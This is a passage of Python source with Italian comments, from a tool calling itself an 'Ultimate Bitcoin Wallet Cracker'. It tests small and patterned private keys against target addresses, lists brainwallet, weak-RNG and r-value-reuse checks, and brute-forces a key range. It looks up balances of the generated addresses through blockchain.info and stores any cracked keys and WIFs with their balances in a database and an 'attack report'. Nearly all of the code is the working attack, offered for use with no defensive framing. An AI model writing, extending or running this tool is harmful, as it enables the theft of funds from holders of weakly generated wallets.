        """Verifica se l'indirizzo è stato generato con una chiave privata molto piccola con implementazione completa"""
        # Prova chiavi private piccole (1-10000)
        max_key = 10000
        
        # Usa tqdm per mostrare il progresso
        for i in tqdm(range(1, max_key + 1), desc="Verifica chiavi piccole", leave=False):
            try:
                private_key_int = i
                
                # Genera indirizzi (compresso e non compresso)
                address_uncompressed = self.private_key_to_address(private_key_int, compressed=False)
                address_compressed = self.private_key_to_address(private_key_int, compressed=True)
                
                # Controlla se corrispondono
                if address == address_compressed or address == address_uncompressed:
                    is_compressed = (address == address_compressed)
                    wif = self.private_key_to_wif(private_key_int, compressed=is_compressed)
                    
                    details = {
                        "small_key": i,
                        "is_compressed": is_compressed
                    }
                    
                    # Aggiungi alla coda per il controllo del saldo
                    self.balance_queue.put((address, hex(private_key_int), wif, "small_private_key", details))
                    return True
            except Exception as e:
                # Continua con la prossima chiave in caso di errore
                continue
        
        # Prova anche con chiavi esadecimali piccole
        small_hex_patterns = [
            "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f",
            "10", "11", "12", "13", "ff", "100", "101", "dead", "beef", "cafe", "babe",
            "face", "f00d", "1337", "7777", "8888", "9999", "aaaa", "bbbb", "cccc", "dddd",
            "eeee", "ffff", "10000", "12345", "54321", "99999", "abcde", "abcdef", "fedcba"
        ]
        
        for pattern in small_hex_patterns:
            try:
                # Converti in intero
                private_key_int = int(pattern, 16)
                
                # Verifica che la chiave sia nell'intervallo valido
                if not 1 <= private_key_int < self.n:
                    continue
                
                # Genera indirizzi (compresso e non compresso)
                address_uncompressed = self.private_key_to_address(private_key_int, compressed=False)
                address_compressed = self.private_key_to_address(private_key_int, compressed=True)
                
                # Controlla se corrispondono
                if address == address_compressed or address == address_uncompressed:
                    is_compressed = (address == address_compressed)
                    wif = self.private_key_to_wif(private_key_int, compressed=is_compressed)
                    
                    details = {
                        "small_hex_key": pattern,
                        "is_compressed": is_compressed
                    }
                    
                    # Aggiungi alla coda per il controllo del saldo
                    self.balance_queue.put((address, hex(private_key_int), wif, "small_hex_private_key", details))
                    return True
            except Exception as e:
                # Continua con il prossimo pattern in caso di errore
                continue
                
        return False
    
    def check_address(self, address):
        """Esegue tutti i controlli di vulnerabilità su un indirizzo con implementazione completa"""
        with self.stats_lock:
            self.addresses_checked += 1
            if self.addresses_checked % 100 == 0:
                print(f"Progresso: {self.addresses_checked} indirizzi controllati, {self.vulnerabilities_found} vulnerabilità trovate")
        
        # Verifica se l'indirizzo è valido
        # Supporta indirizzi legacy, P2SH e bech32
        if not re.match(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^bc1[ac-hj-np-z02-9]{39,59}$|^bc1[a-z0-9]{8,87}$', address):
            print(f"Indirizzo non valido: {address}")
            return False
        
        # Esegui tutti i controlli di vulnerabilità in ordine di probabilità/efficienza
        vulnerability_checks = [
            # Metodi più veloci e più probabili prima
            self.check_weak_keys,
            self.check_small_private_key,
            self.check_known_keys,
            self.check_brainwallet,
            self.check_time_based_key,
            
            # Metodi più lenti o meno probabili dopo
            self.check_mnemonic_seed,
            self.check_sequential_wallet,
            self.check_r_value_reuse,
            self.check_bitflip_address,
            self.check_vanity_address,
            self.check_address_typo,
            self.check_bip38_password,
            self.check_insecure_rng
        ]
        
        # Log dell'inizio della scansione
        scan_start_time = time.time()
        
        # Esegui i controlli in sequenza
        for check_func in vulnerability_checks:
            try:
                check_start_time = time.time()
                check_name = check_func.__name__
                
                # Esegui il controllo
                if check_func(address):
                    # Calcola il tempo impiegato
                    check_duration = time.time() - check_start_time
                    print(f"Trovata vulnerabilità con {check_name} per {address} in {check_duration:.2f} secondi")
                    
                    # Log del successo
                    with open("successful_checks.log", "a") as f:
                        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {address} - {check_name} - {check_duration:.2f}s\n")
                    
                    return True
                
                # Se il controllo impiega troppo tempo, loggalo
                check_duration = time.time() - check_start_time
                if check_duration > 5:  # più di 5 secondi
                    print(f"Controllo {check_name} per {address} ha impiegato {check_duration:.2f} secondi")
                    with open("slow_checks.log", "a") as f:
                        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {address} - {check_name} - {check_duration:.2f}s\n")
                
            except Exception as e:
                print(f"Errore durante {check_func.__name__} per {address}: {str(e)}")
                # Log dell'errore
                with open("error_log.txt", "a") as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Errore in {check_func.__name__} per {address}: {str(e)}\n")
        
        # Calcola il tempo totale della scansione
        total_scan_time = time.time() - scan_start_time
        if total_scan_time > 10:  # più di 10 secondi
            print(f"Scansione completa di {address} ha impiegato {total_scan_time:.2f} secondi")
            with open("slow_scans.log", "a") as f:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {address} - {total_scan_time:.2f}s\n")
        
        return False
    
    def process_addresses(self, addresses, num_threads=8):
        """Processa una lista di indirizzi in parallelo con implementazione completa"""
        print(f"Inizio scansione di {len(addresses)} indirizzi con {num_threads} thread...")
        
        # Registra l'inizio della scansione nel database
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        start_time = time.strftime("%Y-%m-%d %H:%M:%S")
        scan_id = None
        
        try:
            c.execute(
                "INSERT INTO scan_stats (start_time, addresses_checked, vulnerabilities_found, scan_type, scan_parameters) VALUES (?, ?, ?, ?, ?)",
                (start_time, 0, 0, "batch_scan", json.dumps({"num_addresses": len(addresses), "num_threads": num_threads}))
            )
            conn.commit()
            scan_id = c.lastrowid
        except Exception as e:
            print(f"Errore nella registrazione dell'inizio della scansione: {str(e)}")
        finally:
            conn.close()
        
        # Inizia il timer
        batch_start_time = time.time()
        
        # Usa tqdm per mostrare una barra di progresso
        with tqdm(total=len(addresses), desc="Scansione indirizzi") as pbar:
            with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
                # Mappa la funzione check_address a tutti gli indirizzi
                future_to_address = {executor.submit(self.check_address, address): address for address in addresses}
                
                # Processa i risultati man mano che sono disponibili
                for future in concurrent.futures.as_completed(future_to_address):
                    address = future_to_address[future]
                    try:
                        result = future.result()
                        if result:
                            print(f"Trovata vulnerabilità per {address}")
                    except Exception as e:
                        print(f"Errore durante la scansione di {address}: {str(e)}")
                    finally:
                        pbar.update(1)
                        
                        # Aggiorna le statistiche nel database ogni 100 indirizzi
                        if pbar.n % 100 == 0 and scan_id:
                            try:
                                conn = sqlite3.connect(self.db_file)
                                c = conn.cursor()
                                c.execute(
                                    "UPDATE scan_stats SET addresses_checked = ?, vulnerabilities_found = ? WHERE id = ?",
                                    (self.addresses_checked, self.vulnerabilities_found, scan_id)
                                )
                                conn.commit()
                                conn.close()
                            except:
                                pass
        
        # Attendi che tutti i controlli del saldo siano completati
        print("Attendendo il completamento dei controlli del saldo...")
        self.balance_queue.join()
        
        # Calcola il tempo totale
        total_time = time.time() - batch_start_time
        addresses_per_second = len(addresses) / total_time if total_time > 0 else 0
        
        # Aggiorna le statistiche finali nel database
        if scan_id:
            try:
                conn = sqlite3.connect(self.db_file)
                c = conn.cursor()
                end_time = time.strftime("%Y-%m-%d %H:%M:%S")
                c.execute(
                    "UPDATE scan_stats SET end_time = ?, addresses_checked = ?, vulnerabilities_found = ? WHERE id = ?",
                    (end_time, self.addresses_checked, self.vulnerabilities_found, scan_id)
                )
                conn.commit()
                conn.close()
            except Exception as e:
                print(f"Errore nell'aggiornamento delle statistiche finali: {str(e)}")
        
        print(f"Scansione completata in {total_time:.2f} secondi ({addresses_per_second:.2f} indirizzi/secondo)")
        print(f"Controllati {self.addresses_checked} indirizzi, trovate {self.vulnerabilities_found} vulnerabilità.")
    
    def extract_addresses_from_file(self, file_path):
        """Estrae indirizzi Bitcoin da un file con implementazione completa"""
        addresses = set()
        
        try:
            # Determina il tipo di file in base all'estensione
            _, ext = os.path.splitext(file_path)
            ext = ext.lower()
            
            if ext == '.csv':
                # Prova diversi delimitatori per i file CSV
                delimiters = [',', ';', '\t', '|']
                max_addresses = 0
                best_addresses = set()
                
                for delimiter in delimiters:
                    try:
                        temp_addresses = set()
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            for line in f:
                                fields = line.strip().split(delimiter)
                                for field in fields:
                                    # Cerca indirizzi Bitcoin in ogni campo
                                    addresses_in_field = self.extract_addresses_from_text(field)
                                    temp_addresses.update(addresses_in_field)
                        
                        if len(temp_addresses) > max_addresses:
                            max_addresses = len(temp_addresses)
                            best_addresses = temp_addresses
                    except:
                        continue
                
                addresses = best_addresses
            elif ext == '.json':
                # Carica il file JSON
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    try:
                        data = json.load(f)
                        # Converti il JSON in stringa per l'estrazione
                        json_str = json.dumps(data)
                        addresses.update(self.extract_addresses_from_text(json_str))
                    except json.JSONDecodeError:
                        # Se non è un JSON valido, trattalo come testo normale
                        f.seek(0)  # Torna all'inizio del file
                        content = f.read()
                        addresses.update(self.extract_addresses_from_text(content))
            else:
                # Tratta come file di testo
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    addresses.update(self.extract_addresses_from_text(content))
            
            print(f"Estratti {len(addresses)} indirizzi unici da {file_path}")
        except Exception as e:
            print(f"Errore nell'estrazione degli indirizzi da {file_path}: {str(e)}")
        
        return list(addresses)
    
    def extract_addresses_from_text(self, text):
        """Estrae indirizzi Bitcoin da un testo con supporto per diversi formati"""
        addresses = set()
        
        # Pattern regex per diversi tipi di indirizzi Bitcoin
        patterns = {
            'legacy': r'[1][a-km-zA-HJ-NP-Z1-9]{25,34}',
            'p2sh': r'[3][a-km-zA-HJ-NP-Z1-9]{25,34}',
            'bech32': r'bc1[ac-hj-np-z02-9]{39,59}',
            'bech32_v1': r'bc1[a-z0-9]{8,87}'
        }
        
        # Cerca tutti i tipi di indirizzi nel testo
        for pattern_name, pattern in patterns.items():
            found = re.findall(pattern, text)
            for addr in found:
                # Verifica che l'indirizzo sia valido (checksum)
                try:
                    if pattern_name in ['legacy', 'p2sh']:
                        # Verifica il checksum per indirizzi base58
                        address_bytes = base58.b58decode(addr)
                        if len(address_bytes) != 25:
                            continue
                        
                        # Estrai versione, payload e checksum
                        version = address_bytes[0]
                        payload = address_bytes[1:21]
                        checksum = address_bytes[21:]
                        
                        # Calcola il checksum corretto
                        versioned_payload = bytes([version]) + payload
                        calculated_checksum = hashlib.sha256(hashlib.sha256(versioned_payload).digest()).digest()[:4]
                        
                        # Confronta i checksum
                        if checksum != calculated_checksum:
                            continue
                    
                    # Se arriviamo qui, l'indirizzo è valido
                    addresses.add(addr)
                except:
                    # In caso di errore, ignora l'indirizzo
                    continue
        
        return addresses
    
    def brute_force_range(self, start, end, batch_size=10000):
        """Esegue un attacco brute force su un range di chiavi private con implementazione completa"""
        print(f"Avvio brute force da {start} a {end} con batch di {batch_size}")
        
        # Registra l'inizio della scansione nel database
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        start_time = time.strftime("%Y-%m-%d %H:%M:%S")
        scan_id = None
        
        try:
            c.execute(
                "INSERT INTO scan_stats (start_time, addresses_checked, vulnerabilities_found, scan_type, scan_parameters) VALUES (?, ?, ?, ?, ?)",
                (start_time, 0, 0, "brute_force", json.dumps({"start": start, "end": end, "batch_size": batch_size}))
            )
            conn.commit()
            scan_id = c.lastrowid
        except Exception as e:
            print(f"Errore nella registrazione dell'inizio del brute force: {str(e)}")
        finally:
            conn.close()
        
        # Inizia il timer
        brute_force_start_time = time.time()
        
        # Usa tqdm per mostrare una barra di progresso
        total_keys = end - start
        with tqdm(total=total_keys, desc="Brute force") as pbar:
            for i in range(start, end, batch_size):
                batch_end = min(i + batch_size, end)
                batch_addresses = {}
                
                # Genera indirizzi per questo batch
                for private_key_int in range(i, batch_end):
                    try:
                        # Verifica che la chiave sia nell'intervallo valido
                        if not 1 <= private_key_int < self.n:
                            continue
                        
                        # Genera indirizzi (compresso e non compresso)
                        address_uncompressed = self.private_key_to_address(private_key_int, compressed=False)
                        address_compressed = self.private_key_to_address(private_key_int, compressed=True)
                        
                        if address_uncompressed:
                            batch_addresses[address_uncompressed] = (private_key_int, False)
                        if address_compressed:
                            batch_addresses[address_compressed] = (private_key_int, True)
                    except Exception as e:
                        # Ignora errori e continua
                        continue
                
                # Controlla i saldi in batch se ci sono indirizzi
                if batch_addresses:
                    # Dividi in batch più piccoli per le API
                    address_chunks = [list(batch_addresses.keys())[i:i+20] for i in range(0, len(batch_addresses), 20)]
                    
                    for chunk in address_chunks:
                        try:
                            # Usa un'API che supporta query multiple
                            addresses_str = ",".join(chunk)
                            url = f"https://blockchain.info/multiaddr?active={addresses_str}"
                            response = self.make_request(url)
                            
                            if response and "addresses" in response:
                                for addr_data in response["addresses"]:
                                    address = addr_data.get("address")
                                    final_balance = addr_data.get("final_balance", 0)
                                    
                                    if address in batch_addresses and final_balance > 0:
                                        private_key_int, is_compressed = batch_addresses[address]
                                        private_key_hex = hex(private_key_int)
                                        wif = self.private_key_to_wif(private_key_int, compressed=is_compressed)
                                        
                                        print(f"[TROVATO] Indirizzo: {address}, Saldo: {final_balance/100000000} BTC, Chiave: {private_key_hex}")
                                        
                                        # Salva nel database
                                        details = {
                                            "range": f"{i}-{batch_end}",
                                            "is_compressed": is_compressed
                                        }
                                        self.save_cracked_wallet(address, private_key_hex, wif, final_balance/100000000, "brute_force", details)
                            
                            # Attendi brevemente per evitare rate limit
                            time.sleep(0.5)
                        except Exception as e:
                            print(f"Errore nel controllo dei saldi per il batch {i}-{batch_end}: {str(e)}")
                
                # Aggiorna il contatore e la barra di progresso
                with self.stats_lock:
                    self.addresses_checked += (batch_end - i) * 2  # *2 perché controlliamo sia compresso che non compresso
                pbar.update(batch_end - i)
                
                # Aggiorna le statistiche nel database ogni 10 batch
                if i % (batch_size * 10) == 0 and scan_id:
                    try:
                        conn = sqlite3.connect(self.db_file)
                        c = conn.cursor()
                        c.execute(
                            "UPDATE scan_stats SET addresses_checked = ?, vulnerabilities_found = ? WHERE id = ?",
                            (self.addresses_checked, self.vulnerabilities_found, scan_id)
                        )
                        conn.commit()
                        conn.close()
                    except:
                        pass
        
        # Calcola il tempo totale
        total_time = time.time() - brute_force_start_time
        keys_per_second = total_keys / total_time if total_time > 0 else 0
        
        # Aggiorna le statistiche finali nel database
        if scan_id:
            try:
                conn = sqlite3.connect(self.db_file)
                c = conn.cursor()
                end_time = time.strftime("%Y-%m-%d %H:%M:%S")
                c.execute(
                    "UPDATE scan_stats SET end_time = ?, addresses_checked = ?, vulnerabilities_found = ? WHERE id = ?",
                    (end_time, self.addresses_checked, self.vulnerabilities_found, scan_id)
                )
                conn.commit()
                conn.close()
            except Exception as e:
                print(f"Errore nell'aggiornamento delle statistiche finali: {str(e)}")
        
        print(f"Brute force completato in {total_time:.2f} secondi ({keys_per_second:.2f} chiavi/secondo)")
        print(f"Controllate {total_keys} chiavi, generati {self.addresses_checked} indirizzi, trovate {self.vulnerabilities_found} vulnerabilità.")
    
    def execute_full_attack(self, file_path=None):
        """Esegue un attacco completo su tutti gli indirizzi forniti con implementazione completa"""
        print("Avvio dell'attacco completo...")
        
        # Carica proxy se disponibili
        self.load_proxies("proxies.txt")
        
        if file_path:
            # Estrai indirizzi dal file
            print(f"Estrazione indirizzi da {file_path}...")
            addresses = self.extract_addresses_from_file(file_path)
            
            if addresses:
                print(f"Trovati {len(addresses)} indirizzi unici.")
                
                # Salva gli indirizzi estratti per riferimento futuro
                with open("extracted_addresses.txt", "w") as f:
                    for addr in addresses:
                        f.write(addr + "\n")
                
                # Processa gli indirizzi estratti
                num_threads = min(os.cpu_count() or 4, 16)  # Limita a 16 thread massimo
                self.process_addresses(addresses, num_threads=num_threads)
            else:
                print("Nessun indirizzo trovato nel file.")
        
        # Esegui anche un attacco brute force su un range piccolo
        # (solo per dimostrazione - in un caso reale questo range sarebbe molto più grande)
        small_range_end = 100000  # Primi 100k numeri
        print(f"Avvio brute force sui primi {small_range_end} numeri...")
        self.brute_force_range(1, small_range_end)
        
        print("Attacco completo terminato.")
        print(f"Totale indirizzi controllati: {self.addresses_checked}")
        print(f"Totale vulnerabilità trovate: {self.vulnerabilities_found}")
        
        # Genera report finale
        self.generate_report()
    
    def generate_report(self):
        """Genera un report dettagliato dell'attacco"""
        try:
            report_file = f"attack_report_{time.strftime('%Y%m%d_%H%M%S')}.txt"
            
            with open(report_file, "w") as f:
                f.write("=== REPORT DELL'ATTACCO BITCOIN WALLET CRACKER ===\n\n")
                f.write(f"Data e ora: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Totale indirizzi controllati: {self.addresses_checked}\n")
                f.write(f"Totale vulnerabilità trovate: {self.vulnerabilities_found}\n\n")
                
                # Estrai statistiche dal database
                conn = sqlite3.connect(self.db_file)
                c = conn.cursor()
                
                # Statistiche per tipo di vulnerabilità
                f.write("=== VULNERABILITÀ PER TIPO ===\n")
                c.execute("SELECT vulnerability_type, COUNT(*) FROM cracked_wallets GROUP BY vulnerability_type")
                for row in c.fetchall():
                    vuln_type, count = row
                    f.write(f"{vuln_type}: {count}\n")
                
                # Wallet con saldo
                f.write("\n=== WALLET CON SALDO ===\n")
                c.execute("SELECT address, private_key, wif, balance, vulnerability_type FROM cracked_wallets WHERE balance > 0")
                wallets_with_balance = c.fetchall()
                if wallets_with_balance:
                    for wallet in wallets_with_balance:
                        addr, priv_key, wif, balance, vuln_type = wallet
                        f.write(f"Indirizzo: {addr}\n")
                        f.write(f"Chiave privata: {priv_key}\n")
                        f.write(f"WIF: {wif}\n")
                        f.write(f"Saldo: {balance} BTC\n")
                        f.write(f"Tipo vulnerabilità: {vuln_type}\n\n")
                else:
                    f.write("Nessun wallet con saldo trovato.\n")
                
                # Statistiche delle scansioni
                f.write("\n=== STATISTICHE DELLE SCANSIONI ===\n")
                c.execute("SELECT scan_type, start_time, end_time, addresses_checked, vulnerabilities_found FROM scan_stats")
                for row in c.fetchall():
                    scan_type, start, end, checked, found = row
                    f.write(f"Tipo: {scan_type}\n")
                    f.write(f"Inizio: {start}\n")
                    f.write(f"Fine: {end if end else 'N/A'}\n")
                    f.write(f"Indirizzi controllati: {checked}\n")
                    f.write(f"Vulnerabilità trovate: {found}\n\n")
                
                conn.close()
                
                f.write("=== FINE DEL REPORT ===\n")
            
            print(f"Report generato: {report_file}")
        except Exception as e:
            print(f"Errore nella generazione del report: {str(e)}")


def main():
    # Verifica che tutte le dipendenze siano installate
    required_packages = [
        "ecdsa", "base58", "requests", "tqdm", "mnemonic", "hdwallet"
    ]
    
    missing_packages = []
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        print("Installazione delle dipendenze mancanti...")
        os.system(f"pip install {' '.join(missing_packages)}")
    
    print("Inizializzazione dell'Ultimate Bitcoin Wallet Cracker...")
    cracker = UltimateBitcoinWalletCracker()
    
    # Controlla se è stato specificato un file come argomento
    import sys
    file_path = "adre.csv"  # Default
    
    if len(sys.argv) > 1:
        file_path = sys.argv[1]
    
    # Avvia l'attacco
    cracker.execute_full_attack(file_path)

if __name__ == "__main__":
    main()
